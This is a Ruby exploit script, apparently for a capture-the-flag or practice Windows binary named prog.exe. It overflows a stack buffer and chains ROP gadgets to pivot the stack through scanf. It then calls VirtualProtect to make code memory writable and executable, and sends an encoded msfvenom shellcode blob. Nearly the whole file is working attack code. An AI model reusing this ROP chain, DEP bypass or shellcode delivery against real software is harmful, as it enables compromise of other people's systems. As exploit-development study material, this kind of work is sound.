#encoding: ascii-8bit

class Array
	def to_payload
		# convert the array of qwords to a raw payload string, and check that there are no bad characters
		payload = self.map{|e| [e].pack('Q*')}.join;
		raise RuntimeError, 'payload contains bad chars' if payload.each_char.any?{|c| c =~ /\s/};
		payload;
	end
end

fake_stack = 0x407100 # 0x407000 - 0x408000 : .bss : -RW--
jmp_scanf = 0x402bf8  # trampoline jmp to scanf
virtualprotect_ptr = 0x00408294 # address of the pointer to VirtualProtect that is in the import table

# first thing to do : scanf("%s", fake_stack); rsp = fake_stack
part1 = [ 0x6161616161616161 ] * (72/8) # 72 bytes (72/8 qwords) to get to the return address
part1 += [ 0x004019cf, 0xdeadbeefdeadbeef, 0x00402a1d ] + [ 0 ] * (0x28/8) # set rax = r8;
part1 += [ 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set r8 = 0
part1 += [ 0x004019cf, fake_stack, 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set rax = fake_stack, set r8=fake_stack
part1 += [ 0x00402a1d ] + [ 0 ] * (0x28 / 8) # set rdx = fake_stack
part1 += [ 0x00402bc0, 0x404000, jmp_scanf, 0x004010a7, 0, 0, 0, 0, 0, 0x0040172c, fake_stack ] # set rcx = address of "%s"; scanf(rcx="%s",rdx=fake_stack); set rsp=fake_stack
# now, the stack will become fake_stack

part2 = [ 0x004019cf, 0x407400, 0x00402bc0, 0, 0x4027ff ] # set rax=0x407400; set rcx=0; set r9 = 0x407400 + 0x28
part2 += [ 0x004019cf, 0xdeadbeefdeadbeef, 0x00402a1d ] + [ 0 ] * (0x28/8); # set rax = r8;
part2 += [ 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set r8 = 0
part2 += [ 0x004019cf, 0x11000, 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set rax = 0x11000; set r8 = 0x11000
part2 += [ 0x00402a1d ] + [ 0 ] * (0x28 / 8) # set rdx = 0x11000
part2 += [ 0x004019cf, 0x11000^0x40, 0x004010a4] + [ 0 ] * (0x28 / 8) # set rax=0x11000^0x40; set r8 = r8^rax = 0x40
part2 += [ 0x00402bc0, 0x401000, 0x004019cf, virtualprotect_ptr, 0x00402353, 0x004010a7, 0, 0, 0, 0, 0 ] # set rcx=0x401000; set rax = virtualprotect_ptr; jmp [virtualprotect_ptr]
# now, 0x11000 bytes from 0x401000 should be ERW
# next thing to do : scanf("%s", 0x401000)
part2 += [ 0x004019cf, 0xdeadbeefdeadbeef, 0x00402a1d ] + [ 0 ] * (0x28/8); # set rax = r8;
part2 += [ 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set r8 = 0
part2 += [ 0x004019cf, 0x401000, 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set rax = 0x401000; set r8 = 0x401000
part2 += [ 0x00402a1d ] + [ 0 ] * (0x28 / 8) # set rdx = 0x401000
part2 += [ 0x00402bc0, 0x404000, jmp_scanf, 0x00401000 ] # set rcx = address of "%s"; scanf(rcx="%s",rdx=0x401000); return to 0x401000

# shellcode generated with msfvenom
shellcode =
"\xeb\x27\x5b\x53\x5f\xb0\xcd\xfc\xae\x75\xfd\x57\x59\x53" +
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f" +
"\xbf\xc1\x74\x07\x80\x3e\xcd\x75\xea\xeb\xe6\xff\xe1\xe8" +
"\xd4\xff\xff\xff\x1d\xcd\xe1\x55\x9e\xf9\xed\xf5\xdd\x1d" +
"\x1d\x1d\x5c\x4c\x5c\x4d\x4f\x4c\x4b\x55\x2c\xcf\x78\x55" +
"\x96\x4f\x7d\x55\x96\x4f\x05\x55\x96\x4f\x3d\x55\x96\x6f" +
"\x4d\x55\x12\xaa\x57\x57\x50\x2c\xd4\x55\x2c\xdd\xb1\x21" +
"\x7c\x61\x1f\x31\x3d\x5c\xdc\xd4\x10\x5c\x1c\xdc\xff\xf0" +
"\x4f\x5c\x4c\x55\x96\x4f\x3d\x96\x5f\x21\x55\x1c\xcd\x96" +
"\x9d\x95\x1d\x1d\x1d\x55\x98\xdd\x69\x7a\x55\x1c\xcd\x4d" +
"\x96\x55\x05\x59\x96\x5d\x3d\x54\x1c\xcd\xfe\x4b\x55\xe2" +
"\xd4\x5c\x96\x29\x95\x55\x1c\xcb\x50\x2c\xd4\x55\x2c\xdd" +
"\xb1\x5c\xdc\xd4\x10\x5c\x1c\xdc\x25\xfd\x68\xec\x51\x1e" +
"\x51\x39\x15\x58\x24\xcc\x68\xc5\x45\x59\x96\x5d\x39\x54" +
"\x1c\xcd\x7b\x5c\x96\x11\x55\x59\x96\x5d\x01\x54\x1c\xcd" +
"\x5c\x96\x19\x95\x55\x1c\xcd\x5c\x45\x5c\x45\x43\x44\x47" +
"\x5c\x45\x5c\x44\x5c\x47\x55\x9e\xf1\x3d\x5c\x4f\xe2\xfd" +
"\x45\x5c\x44\x47\x55\x96\x0f\xf4\x4a\xe2\xe2\xe2\x40\x55" +
"\xa7\x1c\x1d\x1d\x1d\x1d\x1d\x1d\x1d\x55\x90\x90\x1c\x1c" +
"\x1d\x1d\x5c\xa7\x2c\x96\x72\x9a\xe2\xc8\xa6\xed\xa8\xbf" +
"\x4b\x5c\xa7\xbb\x88\xa0\x80\xe2\xc8\x55\x9e\xd9\x35\x21" +
"\x1b\x61\x17\x9d\xe6\xfd\x68\x18\xa6\x5a\x0e\x6f\x72\x77" +
"\x1d\x44\x5c\x94\xc7\xe2\xc8\x7e\x7c\x71\x7e\x33\x78\x65" +
"\x78\x1d\xbf\xc1"

IO.popen '.\\prog.exe', 'r+' do |io|
	puts io.gets;
	io.write( part1.to_payload + "\n"); # send part1
	sleep 0.5;
	puts io.gets
	io.write( part2.to_payload + "\n"); # send part2
	sleep 0.5;
	io.write( shellcode + "\n"); # send the final shellcode
end
